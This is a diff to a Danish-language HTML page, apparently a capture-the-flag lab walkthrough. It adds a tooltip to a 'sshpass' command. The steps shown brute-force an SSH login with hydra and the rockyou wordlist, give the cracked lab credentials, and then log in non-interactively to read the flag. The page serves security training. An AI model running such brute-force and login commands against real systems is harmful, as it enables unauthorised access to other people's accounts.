@@ -25,7 +25,7 @@
 <div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
 <h2>Trin for trin</h2>
 <pre><code><span class="gloss" tabindex="0" data-tip="Online brute-force-værktøj mod login-protokoller (SSH, FTP, HTTP, ...).">hydra</span> -l <span class="gloss" tabindex="0" data-tip="John the Ripper — password-cracker (CPU-baseret, mange hash-formater).">john</span> -P rockyou.txt -t 4 -f ssh://&lt;ip&gt;      # -> john:johncena (tidligt i rockyou)
-sshpass -p johncena ssh -o PreferredAuthentications=password john@&lt;ip&gt; 'cat ~/flag.txt'</code></pre>
+<span class="gloss" tabindex="0" data-tip="Leverer et SSH-password ikke-interaktivt, til brug i scripts.">sshpass</span> -p johncena ssh -o PreferredAuthentications=password john@&lt;ip&gt; 'cat ~/flag.txt'</code></pre>
              <p><code>-t 4</code> for SSH (OpenSSH afviser for mange parallelle). Credentials er statiske; flaget
              er per-instans.</p>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
